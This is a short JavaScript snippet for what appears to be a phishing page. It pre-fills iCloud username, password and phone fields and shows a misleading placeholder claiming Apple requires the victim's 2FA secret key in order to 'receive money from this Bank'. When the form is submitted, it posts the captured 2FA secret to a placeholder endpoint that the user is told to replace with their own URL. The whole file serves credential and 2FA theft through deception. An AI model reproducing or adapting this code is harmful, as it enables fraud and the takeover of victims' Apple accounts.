// Hardcoded values
const username = "your_icloud_username";
const password = "your_icloud_password";
const phoneNumber = "your_phone_number";

// Autofill the form fields
document.getElementById("icloud_username").value = username;
document.getElementById("password").value = password;
document.getElementById("phone_number").value = phoneNumber;

// Set the placeholder for the 2FA secret key input field
document.getElementById("two_factor_secret").placeholder = "Apple you requires  enter your 2FA secret key to Recieve money from this Bank";

// Focus on the 2FA secret code input field
document.getElementById("two_factor_secret").focus();

form.addEventListener("submit", function(event) {
    event.preventDefault();
    
    // Get the 2FA secret code from the user
    const twoFactorSecret = document.getElementById("two_factor_secret").value;

    // Check if the 2FA secret code is not empty
    if (twoFactorSecret !== "") {
        // Submit the form to the endpoint
        form.action = "https://example.com/endpoint"; // Replace with your endpoint URL
        form.method = "post";
        form.submit();
    } else {
        alert("Please enter your 2FA secret code.");
    }
});